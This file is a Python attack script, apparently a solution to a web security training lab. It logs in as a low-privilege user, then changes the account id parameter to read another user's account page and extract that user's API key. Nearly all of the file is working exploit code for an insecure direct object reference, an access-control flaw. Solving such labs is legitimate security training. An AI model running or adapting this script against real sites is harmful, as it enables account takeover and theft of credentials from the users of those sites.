import sys
import requests
import urllib3
import re
import os
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    'http': "http://" + os.getenv("PROXY_IP") + ":" + os.getenv("PROXY_PORT"),
    'https': "https://" + os.getenv("PROXY_IP") + ":" + os.getenv("PROXY_PORT")
}

victim_username = "carlos"


def get_csrf_token(s, url):
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input", {'name': 'csrf'})['value']
    return csrf


def get_api_key(s, url):
    # Get csrf token in login
    login_url = url + "/login"

    csrf_token = get_csrf_token(s, login_url)
    # Login as the wiener user
    print("(+) Login as wiener user...")
    data_login = {"csrf": csrf_token, "username": "wiener", "password": "peter"}
    r = s.post(login_url, data=data_login, verify=False, proxies=proxies)
    res = r.text

    if "Log out" in res:
        print("(+) Logged In as the wiener user")
        # Exploit Access Control Vulnerability and access another user acc
        victim_url = url + "/my-account?id=c6699b08-fb0a-4935-b52c-61930ba6b44c"

        r = s.get(victim_url, verify=False, proxies=proxies)
        res = r.text

        if victim_username in res:
            print(f"(-> Successfully accessed {victim_username} account")
            print(f"(-> Retrieving API key...")

            regex_text = "Your API Key is:(.*)"
            api_key = re.search(regex_text, res).group(1)
            print(f"API Key is: " + api_key.split("</div>")[0])
        else:
            print(f"(-) Could not access {victim_username} account")
            sys.exit(-1)
    else:
        print("(-) Could not log in as the wiener user")
        sys.exit(-1)


def main():
    if len(sys.argv) != 2:
        print("(-> Usage: %s <url>" % sys.argv[0])
        print("(-> Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    print("(-> Horizontal privilege escalation vulnerability...")
    # pass cookies of user in login
    s = requests.Session()
    print(s)

    get_api_key(s, url)


if __name__ == "__main__":
    main()
